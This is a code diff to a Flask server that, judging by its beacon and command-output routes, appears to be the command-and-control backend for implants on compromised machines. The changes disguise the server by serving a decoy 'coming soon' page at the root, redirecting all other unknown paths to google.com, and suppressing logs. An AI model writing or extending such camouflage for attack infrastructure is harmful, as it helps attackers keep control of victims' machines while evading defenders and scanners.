@@ -1,4 +1,4 @@
-from flask import Flask, request, jsonify
+from flask import Flask, request, jsonify, redirect, send_file
 import uuid
 import time
 import logging
@@ -6,8 +6,17 @@ from Modules.global_objects import beacons, add_beacon_list, beacon_commands
 
 app = Flask(__name__)
 log = logging.getLogger('werkzeug')
+app.logger.setLevel(logging.ERROR)
 log.setLevel(logging.ERROR)
 
+@app.route('/')
+def index():
+    return send_file("html/coming_soon.html")
+
+    
+@app.route('/<path:unknown_path>')
+def catch_all(unknown_path):
+    return redirect('https://www.google.com')
 
 @app.route('/connection', methods=['GET'])
 def connection():
@@ -80,13 +89,17 @@ def response():
             if i < len(beacon_commands["command_output"]):
                 beacon_commands["command_output"][i] = output
                 print(
-                    f"Command {beacon_commands['beacon_uuid'][i]} responded with:"
+                    f"Command {beacon_commands['beacon_uuid'][i]} ",
+                    "responded with:"
                 )
                 print(output)
             else:
                 print(
-                    f"Index {i} out of range for {beacon_commands['command_output']}"
+                    f"Index {i} out of range for ",
+                    f"{beacon_commands['command_output']}"
                 )
     if not found:
         return '', 500
     return '', 200
+
+
